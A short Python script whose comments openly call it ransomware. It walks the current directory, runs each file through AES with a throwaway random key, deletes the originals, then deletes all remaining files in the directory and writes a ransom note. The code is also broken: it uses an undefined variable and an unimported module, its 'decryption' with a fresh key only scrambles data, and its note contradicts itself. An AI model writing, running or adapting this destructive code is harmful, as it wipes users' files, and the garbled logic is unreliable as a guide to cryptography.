#!/usr/bin/python3

import os
import sys
import time
import random
import string
import shutil
import socket
import urllib.request

from Crypto.Cipher import AES
from Crypto import Random

BLOCK_SIZE = 16

PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

secret = os.urandom(BLOCK_SIZE)
print(secret)
cipher = AES.new(secret, AES.MODE_ECB)

#Decode
decoded = DecodeAES(cipher, encoded)
print('Decrypted string:', decoded)

#Decrypt a file
def decrypt_file(file_name):
    with open(file_name, 'rb') as fo:
        ciphertext = fo.read()
    dec = cipher.decrypt(ciphertext)
    with open(file_name[:-4], 'wb') as fo:
        fo.write(dec)
    os.remove(file_name)
    
#Decrypt all files in a directory
def decrypt_dir(dir_name):
    for root, dirs, files in os.walk(dir_name):
        for file in files:
            if (file != "decrypt_dir.py"):
                decrypt_file(os.path.join(root,file))
                
#Ransomware
def ransomware():
    #Create encrypted and decrypted copies of all files
    decrypt_dir(os.getcwd())
    #Delete original file
    for root, dirs, files in os.walk(os.getcwd()):
        for file in files:
            if ( file != "decrypt_dir.py"):
                 os.remove(os.path.join(root,file))
    
    
    
     #Create ransom note
    with open("ransom_note.txt", "w") as f:
        f.write("Your files have been decrypted!\n")
                    
